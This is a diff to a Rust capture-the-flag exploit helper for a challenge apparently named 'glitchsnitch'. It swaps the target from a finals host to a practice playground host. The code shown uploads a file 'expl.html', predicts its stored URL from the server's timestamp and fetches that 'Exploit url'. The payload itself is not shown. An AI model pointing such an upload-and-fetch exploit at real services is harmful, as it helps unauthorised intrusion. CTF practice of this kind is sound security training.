@@ -6,7 +6,7 @@ use reqwest::header::{COOKIE, DATE};
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
-    let backend_url = "https://glitchsnitch.finals.scc2025.ctf.rs/api/upload";
+    let backend_url = "https://glitchsnitch.playground.cyberhero.rs/api/upload";
     let file_path = "expl.html";
 
     let file_bytes = fs::read(file_path).await?;
@@ -33,8 +33,8 @@ async fn main() -> anyhow::Result<()> {
 
             println!("Server time (Unix timestamp): {:?}", timestamp);
 
-            let file_url = format!("https://glitchsnitch.finals.scc2025.ctf.rs/_{timestamp}.html");
-            
+            let file_url = format!("https://glitchsnitch.playground.cyberhero.rs/_{timestamp}.html");
+
             println!("Exploit url: {}", file_url);
             let res = client
                 .get(file_url)
